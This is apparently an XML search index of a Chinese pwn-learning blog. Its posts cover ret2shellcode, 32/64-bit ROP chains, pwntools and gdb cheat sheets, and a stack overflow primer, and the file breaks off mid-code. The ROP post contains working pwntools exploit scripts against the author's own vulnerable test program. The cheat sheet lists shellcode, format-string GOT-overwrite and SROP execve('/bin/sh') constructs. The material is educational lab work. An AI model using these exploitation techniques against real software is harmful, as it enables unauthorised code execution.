<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从0开始学pwn-3-ret2shellcode</title>
      <link href="/2021/12/18/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-3-ret2shellcode/"/>
      <url>/2021/12/18/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-3-ret2shellcode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如果只是跳转到程序已有的代码,无疑是局限性极大的,毕竟正经程序员不会给自己的程序写后门,我们需要自己往里面送入恶意代码</p><span id="more"></span><h2 id="什么是ret2shellcode"><a href="#什么是ret2shellcode" class="headerlink" title="什么是ret2shellcode"></a>什么是ret2shellcode</h2><p>ret2shellcode的思路就是,首先向程序中送入一段shellcode(恶意代码),然后,通过其它手法(比如栈溢出)跳转到shellcode上,使shellcode作为机器码被执行,从而达成攻击目的</p><h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>用以下程序作为攻击示例</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> 从0开始学pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0开始学pwn-2-ROP</title>
      <link href="/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/"/>
      <url>/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ROP,全称是Return-oriented Programming(面向返回编程)</p><span id="more"></span><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP是一种用于绕过各种现代操作系统防御(例如NX,内存不可执行防御)的技术,也是众多高级利用手法的基础<br>ROP的方法的核心在于,利用每个函数最都会有的ret指令,使用可以被控制的栈来伪造或操纵参数,以达到连续,多次调用函数,并伪造参数的目的<br>在ROP的过程中,ret的作用不再是返回到调用函数,而是起到将多个代码片段拼接起来的作用,故而称之为面向返回编程<br>ROP最为精妙的地方在于,它执行的所有代码,都是程序本身的代码,用正常代码达到了恶意代码的效果,并且不容易被检测到,我愿称之为代码张三丰,借力打力那叫一个6</p><h2 id="相关工具介绍"><a href="#相关工具介绍" class="headerlink" title="相关工具介绍"></a>相关工具介绍</h2><p>想要使用ROP,需要以ret为结尾(当然有些情况下也可以不是)的代码块,除了一整个函数这样的,更多的是ret前面就一两句这种,比如[pop rdi;ret;]这种,我们称这种小代码片段为gadget<br>寻找gadget的工具常用的有ROPgadget和ropper,其中ROPgadget是pwntools自带的工具</p><h2 id="32位ROP"><a href="#32位ROP" class="headerlink" title="32位ROP"></a>32位ROP</h2><h3 id="32位下伪造参数调用函数"><a href="#32位下伪造参数调用函数" class="headerlink" title="32位下伪造参数调用函数"></a>32位下伪造参数调用函数</h3><p>在32位下,伪造参数调用函数很简单,让我们先复习一下函数的调用过程<br>首先,参数被依次压入栈中,然后,返回地址入栈,然后进入函数<br>就到这里就行了,可以看出,在进入函数之前,栈上的结构是这样的<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011513190.png" loading="lazy"> </p><p>再回过头来看看栈溢出劫持控制流的过程中,栈帧的结构<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011523067.png" loading="lazy"> </p><p>当栈溢出劫持成功之后,就该是这样的<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011530754.png" loading="lazy"> </p><p>那么想要再栈溢出劫持的时候伪造参数该怎么办呢?很简单,在要跳转的函数的地址下面伪造一个进栈之前的结构就行了<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011541883.png" loading="lazy"> </p><p>具体的,让我们用一个例子来试一试</p><pre><code>#include &lt;stdio.h&gt;char *str1=&quot;this is a string&quot;;char *str2=&quot;this is a string too&quot;;char *str3=&quot;this is also a string&quot;;void fun(char* str)&#123;    puts(str);&#125;void vul()&#123;    puts(&quot;ROP&quot;);    char buf[16];    gets(buf);&#125;int main()&#123;    vul();&#125;</code></pre><p>先放exp</p><pre><code>from pwn import *p=process(&quot;./基础ROP-32位&quot;)fun=0x08049186str1=0x0804A008main=0x080491E6payload=b&quot;a&quot;*0x1cpayload+=p32(fun)payload+=p32(main)payload+=p32(str1)p.sendline(payload)p.interactive()</code></pre><p>看一下效果</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032047369.png" loading="lazy"> </p><p>可以看到,我们跳转到的是fun函数,伪造了fun函数的参数(str1),和返回地址(main),所以先输出了”ROP”,随后程序被劫持到了fun(str1),输出了”this is a string”,fun函数结束后又回到被伪造的返回地址(main),再继续运行</p><p>使用gdb来更清晰的还原整个过程</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032100422.png" loading="lazy"> </p><p>可以看到,在ret进入fun函数之后,栈上的结构是这样的:main,str1</p><p>而正常call进入函数的时候,函数的栈顶往下是这样的:返回地址,参数</p><p>所以这里main就成为了伪造的返回地址,str1成为了伪造的参数</p><p>那么继续运行</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032104635.png" loading="lazy"> </p><p>可以看到,fun在ret的时候是ret到main去了的,所以程序又会从main开始执行一遍</p><p>那么我们就明白了怎么构造32位下的伪造函数参数了,即把返回地址和参数跟在跳转地址后面就行了(假如返回地址不重要,你也可以乱写一个返回地址)</p><h3 id="32位下连续调用函数"><a href="#32位下连续调用函数" class="headerlink" title="32位下连续调用函数"></a>32位下连续调用函数</h3><p>上面我们明白了怎么伪造一个函数的参数去调用它</p><p>然而当我们尝试连续调用时就会发现一个问题</p><p>例如这里我要调用fun(str1);fun(str2),然后返回main</p><p>构造第一次调用很简单</p><pre><code>payload=b&quot;a&quot;*0x1cpayload+=p32(fun)payload+=p32(fun)payload+=p32(str1)</code></pre><p>但是你就会发现,第二个fun的参数和返回地址不好写,由于第二个fun的位置在第一个fun的返回地址,所以第二个fun的返回地址位置和第一个fun的参数位置重合了(也就是都该在上面的str1处)</p><p>在这种情况下,我们可以借助形似pop xxx;ret的gadget来串联调用</p><p>用ROPgadget查找这样的gadget</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032144247.png" loading="lazy"> </p><pre><code>pop1=0x08049022payload=b&quot;a&quot;*0x1cpayload+=p32(fun)payload+=p32(pop1)payload+=p32(str1)payload+=p32(fun)payload+=p32(main)payload+=p32(str2)</code></pre><p>这样,就可以使用这个pop将栈里面第一个fun的参数pop出来,这样就可以直接在后面添加第二次调用了</p><p>完整exp</p><pre><code>from pwn import *p=process(&quot;./基础ROP-32位&quot;)fun=0x08049186str1=0x0804A008str2=0x0804A019main=0x080491E6pop1=0x08049022payload=b&quot;a&quot;*0x1cpayload+=p32(fun)payload+=p32(pop1)payload+=p32(str1)payload+=p32(fun)payload+=p32(main)payload+=p32(str2)p.sendline(payload)p.interactive()</code></pre><p>效果</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159160.png" loading="lazy"> </p><p>来用gdb看一下这个过程</p><p>首先,在ret第一次进入fun时,栈上有返回地址(pop ebx,ret),然后是参数(str1)</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159746.png" loading="lazy"> </p><p>在第一次fun的结尾,准备执行pop ebx,ret</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159476.png" loading="lazy"> </p><p>到了pop ebx;ret;后,pop ebx将栈中的第一个fun的参数(str1)弹出,ret使程序进入第二个fun</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200786.png" loading="lazy"> </p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200736.png" loading="lazy"> </p><p>第二次进入fun,可以看到栈上是第二次fun的返回地址(main)和参数(str2)</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200671.png" loading="lazy"> </p><p>第二次fun执行完后,回到了main</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032203327.png" loading="lazy"> </p><p>那么32位的连续调用就是这样,通过pop+ret的方式来串联各次调用</p><p>3次,乃至更多次调用函数都是一样的</p><p>下面是一个3次调用fun后返回main的exp</p><pre><code>from pwn import *p=process(&quot;./基础ROP-32位&quot;)fun=0x08049186str1=0x0804A008str2=0x0804A019str3=0x0804A02Emain=0x080491E6pop1=0x08049022payload=b&quot;a&quot;*0x1cpayload+=p32(fun)payload+=p32(pop1)payload+=p32(str1)payload+=p32(fun)payload+=p32(pop1)payload+=p32(str2)payload+=p32(fun)payload+=p32(main)payload+=p32(str3)p.sendline(payload)p.interactive()</code></pre><p>当然,假如这个函数有两个参数,就得用pop xxx;pop xxx;ret这种gadget了,更多的参数依次类推</p><h2 id="64位ROP"><a href="#64位ROP" class="headerlink" title="64位ROP"></a>64位ROP</h2><h3 id="64位下伪造参数调用函数"><a href="#64位下伪造参数调用函数" class="headerlink" title="64位下伪造参数调用函数"></a>64位下伪造参数调用函数</h3><p>希望你还没有忘记,64位下前六个参数是通过寄存器传递的(rdi,rsi,rdx,rcx,r8,r9)</p><p>绝大多数函数都不会超过六个参数,也就是说64位绝大多数函数都通过寄存器传参</p><p>这种情况下,我们就需要通过栈来控制寄存器,需要借助类似pop rdi;ret;这样的gadget</p><p>还是这个程序</p><pre><code>#include &lt;stdio.h&gt;char *str1=&quot;this is a string&quot;;char *str2=&quot;this is a string too&quot;;char *str3=&quot;this is also a string&quot;;void fun(char* str)&#123;    puts(str);&#125;void vul()&#123;    puts(&quot;ROP&quot;);    char buf[16];    gets(buf);&#125;int main()&#123;    vul();&#125;</code></pre><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032221375.png" loading="lazy"> </p><p>ROPgadget很容易查到了能够控制rdi和rsi的gadget(这两条gadget在__libc_csu_init函数里,在gcc11以前的版本中,编译的每一个程序中都有这个函数)</p><p>注意rsi的gadget还有一个pop r15,反正r15一般用不到,直接乱填一个占位就行了</p><p>由于这里我的fun函数只有一个参数,只需要控制rdi就可以了</p><p>exp</p><pre><code>from pwn import *p=process(&quot;./基础ROP-64位&quot;)fun=0x4004F7str1=0x4005D4main=0x40053Ardi=0x4005b3payload=b&quot;a&quot;*0x18payload+=p64(rdi)payload+=p64(str1)payload+=p64(fun)payload+=p64(main)p.sendline(payload)p.interactive()</code></pre><p>gdb看一看</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041432975.png" loading="lazy"> </p><p>由pop rdi将栈上的参数放入rdi</p><p>然后进入fun函数</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041431028.png" loading="lazy"> </p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041433342.png" loading="lazy"> </p><p>可以看到,进入fun函数时,rdi的值就是第一个参数,也就是str1</p><h3 id="64位下连续调用参数"><a href="#64位下连续调用参数" class="headerlink" title="64位下连续调用参数"></a>64位下连续调用参数</h3><p>相比其32位,64位中连续调用函数则简单的多,因为参数不在栈上,不需要额外的pop来调整,直接顺着写过去就行</p><p>exp</p><pre><code>from pwn import *p=process(&quot;./基础ROP-64位&quot;)fun=0x4004F7str1=0x4005D4str2=0x4005E5str3=0x4005FAmain=0x40053Ardi=0x4005b3payload=b&quot;a&quot;*0x18payload+=p64(rdi)payload+=p64(str1)payload+=p64(fun)payload+=p64(rdi)payload+=p64(str2)payload+=p64(fun)payload+=p64(rdi)payload+=p64(str3)payload+=p64(fun)payload+=p64(main)p.sendline(payload)p.interactive()</code></pre><p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041443272.png" loading="lazy"> </p><p>很简单,就是把下一个函数开始伪造参数的地方写在上一个函数的后面(也就是返回地址),不需要排布,就不赘述了</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="广义上的ROP"><a href="#广义上的ROP" class="headerlink" title="广义上的ROP"></a>广义上的ROP</h3><p>广义上的ROP还包括了JOP(Jump-oriented Programming,面向跳转编程)和COP(Call-oriented Programming,面向调用编程)等,其gedget不一定是以ret为结尾,也可以以jmp,甚至以call结尾</p><p>例如找不到pop rcx;ret;,但是存在pop rax;pop rcx;jmp rax;这样的,其效果和ret是一样的,核心就在于要灵活运用跳转指令,要能够根据实际情况串联ROP链</p><h3 id="高级的ROP应用"><a href="#高级的ROP应用" class="headerlink" title="高级的ROP应用"></a>高级的ROP应用</h3><p>由于ROP是一种很基础的手法,其结合其他一些机制,可以诞生很多更为高级的运用,比如SROP和ret2dlresolve,这些让我们后面再谈</p><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>本篇博客所有使用到的代码和程序均可在以下链接获取</p><p><a href="https://pan.baidu.com/s/1emnc_qRzXw9BkOUpqno8hA">百度云</a> 密码: 6hud</p>]]></content>
      
      
      <categories>
          
          <category> 从0开始学pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools常用语句</title>
      <link href="/2021/11/26/pwntools%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/"/>
      <url>/2021/11/26/pwntools%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>pwntools是pwn手的必备工具</p><span id="more"></span><h2 id="环境变量设置"><a href="#环境变量设置" class="headerlink" title="环境变量设置"></a>环境变量设置</h2><pre><code>#将所有context清空context.clear()#设置目标系统#常用值:linux,windowscontext.os=&quot;linux&quot;#设置目标cpu架构#常用值:i386,amd64context.arch=&quot;i386&quot;#设置默认数据存储模式#常用值:little,bigcontext.endian=&quot;little&quot;#设置日志等级#常用值:debug,info,warn,errorcontext.log_level=&quot;info&quot;</code></pre><h2 id="连接与交互"><a href="#连接与交互" class="headerlink" title="连接与交互"></a>连接与交互</h2><p>连接</p><pre><code>#启动一个本地进程p=process(&quot;bin_path&quot;)#连接到一个远程端口p=remote(&quot;ip&quot;,port)</code></pre><p>交互</p><pre><code>#发送信息p.send(message)#发送信息并在其后添加换行p.sendline(message)#在接受到某个信息后发送p.sendafter(recv_massage,message)#在接受到某个信息后发送并在其后添加换行p.sendlineafter(recv_massage,message)#接受固定长度信息p.recv(count)#一直接受直到接收到某个信息p.recvuntil(recv_message)#进入直接交互模式p.interactive()</code></pre><h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><pre><code>#编码#方法名中的数字即位数p8(num)p16(num)p32(num)p64(num)#解码#方法名中的数字即位数u8(bytes)u16(bytes)u32(bytes)u64(bytes)</code></pre><h2 id="elf文件处理"><a href="#elf文件处理" class="headerlink" title="elf文件处理"></a>elf文件处理</h2><pre><code>#加载文件并读取基本信息elf=ELF(&quot;bin_path&quot;)#获取函数地址elf.symbols[&quot;function_name&quot;]#获取函数的got表地址elf.got[&quot;function_name&quot;]#获取函数的plt表地址elf.plt[&quot;function_name&quot;]</code></pre><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>从gdb启动程序</p><pre><code>p=gdb.debug(&quot;bin_path&quot;,&quot;gdb_command&quot;)</code></pre><p>使用gdb附加调试</p><pre><code>gdb.attach(p)p.interactive()</code></pre><h2 id="shellcraft-amp-asm"><a href="#shellcraft-amp-asm" class="headerlink" title="shellcraft&amp;asm"></a>shellcraft&amp;asm</h2><p>对一段汇编代码进行汇编</p><pre><code>asm(code)</code></pre><p>使用shellcraft模块生产汇编代码<br>这个模块支持相当多的用法，这里仅列出常用的</p><pre><code>#shellcodeshellcraft.sh()#open(&quot;file&quot;,&quot;r&quot;)shellcraft.open(&quot;file&quot;,&quot;r&quot;)#read(file,memory,count)shellcraft.read(file,memory,count)#write(file,memory,count)shellcraft.write(file,memory,count)</code></pre><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><pre><code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><p>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</p><h2 id="SROP构造"><a href="#SROP构造" class="headerlink" title="SROP构造"></a>SROP构造</h2><pre><code>frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = stack_addr          #&amp;&#39;/bin/sh&#39;frame.rsi = 0frame.rdx = 0frame.rsp = stack_addrframe.rip = syscall</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用说明 </category>
          
          <category> pwn工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb(with pwndbg)常用命令</title>
      <link href="/2021/11/14/gdb%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/11/14/gdb%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>gdb是pwn手们最常用的调试器</p><span id="more"></span><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><pre><code>#对函数下断点b function_name#对地址下断点b *address#下改监控点watch expr#下读监控点rwatch expr#下读改监控点awatch expr#下条件断点break ... if exprwateh ... if expr#设置断点生效次数ignore bnum count</code></pre><h3 id="查看断点"><a href="#查看断点" class="headerlink" title="查看断点"></a>查看断点</h3><pre><code>#查看所有断点i b#查看指定断点i b bnum#查看监控点i watchpoint</code></pre><h3 id="禁用和启用断点"><a href="#禁用和启用断点" class="headerlink" title="禁用和启用断点"></a>禁用和启用断点</h3><pre><code>#禁用所有断点dis#启用所有断点en#禁用指定断点dis bnum#启用指定断点en bnum</code></pre><h3 id="删除断点"><a href="#删除断点" class="headerlink" title="删除断点"></a>删除断点</h3><pre><code>#删除所有断点del#删除单个断点del bnum</code></pre><h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><pre><code>#直接运行r#运行到程序入口start#继续运行c#单步步过s#单步步入n#跳转运行jump *address#运行到函数结束nextret</code></pre><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><pre><code>#查看所有寄存器i r#查看所有函数i fun#查看内存布局vmmap#查看堆块空闲链bins#查看堆分配状况heap#查看堆分配状况和内容vis#查看栈情况stackstack num#查看变量或地址print exprprint &amp;expr#查看内存x/[num][format][add_length] address#num:查看的单位长度#format:显示方式    x    16进制    d    10进制    u    10进制无符号    o    8进制    t    2进制    a    16进制地址    i    指令    c    字符    f    浮点数#add_length:地址单元的长度    b    单字节    h    双字节    w    4字节    g    8字节#常见内存读取指令#反汇编查看指令x/20i address#32位16进制数据x/20xw address#64位16进制数据x/20xg address#查看内存内容和相关信息tele address</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用说明 </category>
          
          <category> pwn工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> pwn </tag>
            
            <tag> 调试器 </tag>
            
            <tag> gdb </tag>
            
            <tag> pwndbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0开始学pwn-1-栈溢出</title>
      <link href="/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前置知识复习"><a href="#前置知识复习" class="headerlink" title="前置知识复习"></a>前置知识复习</h2><h3 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈?"></a>什么是栈?</h3><h4 id="数据结构意义上的栈"><a href="#数据结构意义上的栈" class="headerlink" title="数据结构意义上的栈"></a>数据结构意义上的栈</h4><h5 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h5><p>在数据结构的表述中,栈是一种线性存储结构,其运算受到限制,使得只能在其一端执行数据操作</p><p>简而言之,就像是一叠书放在桌子上,你想要放书,只能放在最顶上(进栈操作),想要拿书,也只能拿最顶上的书(出栈操作),而这叠书的顶就称之为栈顶,底部就称为栈底</p><h5 id="栈的特点"><a href="#栈的特点" class="headerlink" title="栈的特点"></a>栈的特点</h5><p>1.后进先出(即更先入栈的元素更后出栈,英文为last in fast out,简写为LIFO)<br>2.线性存储(可以通过下标直接索引到每个元素)<br>3.受限访问(只能操作栈顶)</p><h5 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h5><p>1.栈顶<br>2.栈底<br>3.入栈(又称为压栈或进栈)<br>4.出栈(又称为弹栈)</p><h4 id="程序运行意义上的栈"><a href="#程序运行意义上的栈" class="headerlink" title="程序运行意义上的栈"></a>程序运行意义上的栈</h4><p>基于栈这种数据结构的特性,其被大量运用于现代编程语言实现函数调用传参和局部变量分配等功能(初学者可能不太懂,没关系,后面会有详细的解释)<br>程序在运行开始时,会由操作系统分配给一块内存,这块内存使用了栈的数据结构,被用于支持程序的参数传递上下文和局部变量分配,该内存被称为程序的运行栈,亦可简称为栈</p><h3 id="栈是怎么工作的"><a href="#栈是怎么工作的" class="headerlink" title="栈是怎么工作的"></a>栈是怎么工作的</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>我们使用一个简单的程序,来观察32位下一次函数调用过程中栈的作用</p><pre><code class="c">#include&lt;stdio.h&gt;void fun(int a1,int a2,int a3,int a4,int a5,int a6,int a7,int a8)&#123;    int b1;    int b2;    int b3;    int b4;    int b5;    int b6;    b1=1;    b2=2;    b3=3;    b4=4;    b5=5;    b6=6;&#125;int main()&#123;    fun(1,2,3,4,5,6,7,8);    return 0;&#125;</code></pre><p>让我们编译一个32位的程序,用反编译器看一看</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012117511.png" loading="lazy"> </p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012117938.png" loading="lazy"> </p><p>可以看到,在正式call进fun函数之前,push将传入的参数保留在栈上,在进入函数后,有sub esp,0x20分配局部变量空间</p><p>让我们动态调试这个程序,以更加清晰的观看一次函数调用的全过程</p><p>首先,运行到调用fun之前</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011855037.png" loading="lazy"> </p><p>可以看到栈顶(esp)和栈底(ebp)都在0xffffcc78,其下是一些程序运行的上下文和其它信息</p><p>在运行到call fun之前,fun函数的所有参数都入栈了</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011857356.png" loading="lazy"> </p><p>call进去,call会在栈上保存函数的返回地址(也就是call指令的下一条,在这里是0x80491c5),这个地址是函数退出时返回的凭据</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118506.png" loading="lazy"> </p><p>进入函数后,最先要做的是脱离原先函数的栈框架,建立函数自己的栈帧框架,所以会先保存原栈帧的栈底(push ebp),再将esp的值赋给ebp(mov ebp,esp),自此,fun函数脱离了main函数的栈帧</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118880.png" loading="lazy"> </p><p>紧接着,就是分配函数局部变量空间(sub esp,0x20)</p><p>至于为什么这里明明fun函数只有6个int类型的局部变量,按道理应该分配4*6=24字节,却分配了32个字节,原因是为了保证读写速度,因为如果内存地址是16的倍数(即十六进制表示末位为0)读写会更快,故而每次分配局部变量空间,都会进行栈对齐,多分配一点<br>可以看到,对齐过后esp(0xffffcc30)和ebp(0xffffcc50)的十六进制末位都为0</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118455.png" loading="lazy"> </p><p>这里esp和ebp之间32个字节的空间就是被分配给函数的局部变量空间(之所以有乱七八糟的内容,是因为我没有给这些变量初始化)</p><p>到这里,进入函数的步骤就结束了,再让我们看看退出函数的步骤</p><p>先运行到退出函数的地方(函数的局部变量已经在运行过程中改变,当然,因为对齐多分配的8个字节0xffffcc30-0xffffcc37没有变)</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011929725.png" loading="lazy"> </p><p>leave是一条复合语句,相当于”mov esp,ebp;pop ebp;”,可以发现,其实就是进入函数时那两句(“push ebp;mov ebp,esp;”)的逆操作</p><p>“mov esp,ebp”回收了fun函数分配的局部变量空间,”pop ebp”恢复了main函数的ebp</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011938493.png" loading="lazy"> </p><p>到了ret指令了,ret指令和call指令是成对的指令,call指令压栈返回地址并进入函数,ret指令弹栈返回地址而退出函数</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011940528.png" loading="lazy"> </p><p>执行完ret过后,你会发现栈结构与执行call之前是完全一致的了,而此时的指令寄存器eip指向的位置正是之前栈中的返回地址(0x80494c5)</p><p>最后,由main函数来清理栈中剩下的传参(add esp,0x20)</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011943771.png" loading="lazy"> </p><p>此时,栈结构完全恢复为调用fun函数之前的状态</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位下的程序栈和32位大差不差,主要只有几个区别</p><p>1.地址单元长度从4个字节变成8个字节,这很好理解,一个字节就是8位,所以32位是4个字节,64位是8个字节</p><p>2.函数的前六个参数不再从栈传递,而是由寄存器传递(依次由rdi,rsi,rdx,rcx,r8,r9传递),从第7个起,再由栈传递,栈传递方式和32位一致</p><p>主要是前六个参数传递的寄存器变化,由于其实鲜有函数具有6个以上的参数,所以64位下据大多数参数传递都是寄存器传递的</p><p>使用上面的代码再编译一个64位程序,来感受一下区别</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012119840.png" loading="lazy">  </p><p>动态调试一下也可以感受到不同</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011955672.png" loading="lazy"> </p><p>可以看到,我已经运行到了call之前,栈上只有7和8这两个参数</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012119019.png" loading="lazy"> </p><p>而前6个参数,依次由rdi,rsi,rdx,rcx,r8,r9传递</p><p>除此之外,64位和32位也无太大区别,故不再赘述</p><h4 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h4><p>通过上面的过程,我们可以发现,每个函数在运行栈中,都有自己的一小段栈空间,我们称之为函数的栈帧,函数栈帧的结构是这样的</p><p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012006063.png" loading="lazy"> </p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="栈溢出的原理"><a href="#栈溢出的原理" class="headerlink" title="栈溢出的原理"></a>栈溢出的原理</h3><p>在上面复习到的栈帧结构中,我们可以发现,函数在返回时,依赖于返回地址来回到原函数<br>而在栈上,局部变量,原函数栈底,和返回地址这三个东西,距离相当接近<br>假如在读写某个局部变量时,由于程序员的不谨慎,导致了越界,读写到了其他变量,使用者就可以篡改其他变量的值<br>更有甚者,读写到了返回地址,导致使用者可以篡改返回地址,这样函数返回的时候就会由于返回地址错误,而跳转向错误的地址!<br>这个两个过程,就是最基础的栈溢出篡改变量和栈溢出劫持程序执行流</p><h3 id="溢出的发生"><a href="#溢出的发生" class="headerlink" title="溢出的发生"></a>溢出的发生</h3><p>在C语言的一些读入函数中,没有限制读入大小,这些函数往往就是溢出的高发地(不只是栈溢出,还包括其它类型的溢出)</p><pre><code class="c">scanf(&quot;%s&quot;,buf);gets(buf);</code></pre><p>还有一些时候,限制了读入大小,但是大小超过了应该有的大小</p><pre><code class="c">char buf[16];read(0,buf,48);</code></pre><p>更有些时候,是由于程序员本身对底层不够了解造成的溢出,这里我举两个例子</p><p>第一个例子</p><pre><code class="c">char buf[32];char str[16];if(read(0,buf,32)&lt;=16)&#123;    strcpy(str,buf);&#125;</code></pre><p>在这个例子中向buf读取最多32个字节,如果读取的字节数少于等于16个字节,就将读入的内容复制到str中</p><p>但是这里有两个问题</p><p>1.我并为给buf进行初始化,buf中会残留有栈上的其他变量值,当strcpy在复制的时候,必须遇到一个字节的\0结束符才会停止,但read在读入的时候,并不会在字符串后面加一个0字节,我这里也没有给buf做初始化,也就是说,假如我输入了16个字节,那么strcpy在复制完这16个字节之后,还会复制接着buf上的残余变量!</p><p>2.即便我把这里的buf初始化为0,也还是有问题的,因为strcpy实际复制的长度是字符串长度加上末尾的\0,一共最多17个字节,超出了str的上限(16个字节),发生了一个字节的零溢出(也就是我们说的off by null)</p><p>第二个例子</p><pre><code class="c">int size;char 